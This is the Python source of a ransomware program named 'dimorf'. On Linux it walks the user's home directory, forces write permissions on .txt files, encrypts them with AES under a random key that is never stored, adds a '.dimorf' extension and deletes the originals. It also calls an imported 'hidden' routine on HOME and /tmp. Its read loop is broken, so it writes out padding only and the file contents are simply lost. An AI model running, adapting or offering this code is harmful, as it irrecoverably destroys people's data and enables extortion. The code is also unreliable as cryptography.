#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# pylint: skip-file

__author__ = 'Wendel Ortiz -> aKa Ort0x36'
__maintainer__ = 'Wendel Ortiz'
__credits__ = ['Contributors']
__module__ = 'dimorf.py'

import sys
import os
from hidden_dimorf import hidden
from time import sleep
from Crypto.Cipher import AES
from Crypto import Random


def check_os(osname: str) -> str | None:
    USER_DIR = os.getenv('HOME')
    
    # # check if os is linux.
    is_linux = [
        prop for prop in os.uname() if (
            (prop == "Linux")
        ) and ((sys.platform == "linux")) and (
            (os.name == osname)
        )
    ]

    # # check python version before called function.
    if ((is_linux) and (sys.version[0] == '3')):
        find_and_encrypt(
            path=USER_DIR,
            ext_files=['.txt'],
            hidden='.',
            new_ext='.dimorf',
            key=Random.get_random_bytes(32),
            block_bytes=65536
        )
        

def find_and_encrypt(
    path: str,
    ext_files: list,
    hidden: str,
    new_ext: str,
    key: bytes,
    block_bytes: int
) -> str | bytes | list | None:

    # # go in search of the file.
    for root, dirs, files in os.walk(path):
        for file in files:
            end_with_ext = [
                ext for ext in ext_files if (
                    file.endswith(
                        ext
                    )
                )
            ]

            # # verify file type.
            if ((end_with_ext) and not(
                file.startswith(
                    hidden
                )
            )):
                
                # # checks if the user has permission on the file.
                if (
                    os.access(
                        os.path.join(
                            root,
                            file
                        ), os.F_OK
                    ) and (
                        os.access(
                            os.path.join(
                                root,
                                file
                            ), os.W_OK
                        )
                    ) and (
                        os.access(
                            os.path.join(
                                root,
                                file
                            ), os.R_OK
                        )
                    )
                ):
                    
                    # # beginning encrypt operations.
                    init_vector = Random.new().read(16)
                    cipher = AES.new(
                        key,
                        AES.MODE_CBC,
                        init_vector
                    )
                    
                    try:
                        # # open and reads file in blocks of 65536 bytes.    
                        with open(os.path.join(root, file), mode='rb') as f:
                            while True:
                                data = f.read(
                                    block_bytes
                                )

                                # # add padding
                                if len(data) == 0:
                                    data += b'\x00\x01' * (
                                        16 - (
                                            len(
                                                data
                                            ) % 16
                                        )
                                    )
                                    break
                                else:
                                    pass

                        # # creates a new one with the same encrypted information
                        # # and adds the modified extension ".dimorf".
                        with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
                            f.write(
                                cipher.encrypt(
                                    data
                                )
                            )
                        
                        # # remove the original file.
                        os.remove(
                            os.path.join(
                                root,
                                file
                            )
                        )
                                            
                    except PermissionError as e:
                        pass
                
                else:
                    try:
                        # # don't have? try assign.
                        os.chmod(
                            os.path.join(
                                root, 
                                file
                            ), 0o644
                        )
                        
                        try:
                            # # beginning encrypt operations.
                            init_vector = Random.new().read(16)
                            cipher = AES.new(
                                key,
                                AES.MODE_CBC,
                                init_vector
                            )
                            
                            # # open and reads file in blocks of 65536 bytes.    
                            with open(os.path.join(root, file), mode='rb') as f:
                                while True:
                                    data = f.read(
                                        block_bytes
                                    )

                                    # # add padding
                                    if len(data) == 0:
                                        data += b'\x00\x01' * (
                                            16 - (
                                                len(
                                                    data
                                                ) % 16
                                            )
                                        )
                                        break
                                    else:
                                        pass
                                
                            # # creates a new one with the same encrypted information
                            # # and adds the modified extension ".dimorf".
                            with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
                                f.write(
                                    cipher.encrypt(
                                        data
                                    )
                                )
                                                    
                            # # remove the original file.
                            os.remove(
                                os.path.join(
                                    root,
                                    file
                                )
                            )
                        
                        except PermissionError:
                            pass
                    
                    except PermissionError:
                        
                        # # generates a log file with the files
                        # # that could not be assigned permission.
                        sleep(2)
                        logs = [
                            ('Erro ao alterar permissões de arquivo.\n'),
                            (f'Arquivos => {os.path.join(root, file)}\n')
                        ]

                        with open('log_dimorf.log', mode='w') as lf:
                            if lf.write(logs[0]):
                                lf.write(logs[1])
                                print(f'\33[32mLogs gerado em {lf}\33[0m')
                                
                            
if __name__ == '__main__':
    os.system('clear')        
    print ("\33[33m  ___  _                __ \n |   \\(_)_ __  ___ _ _ / _|\n | |) | | '  \\/ _ \\ '_|  _|\n |___/|_|_|_|_\\___/_| |_|\n")
    check_os('posix')
    hidden(
        HOME=os.getenv("HOME"),
        TMP="/tmp"
    )
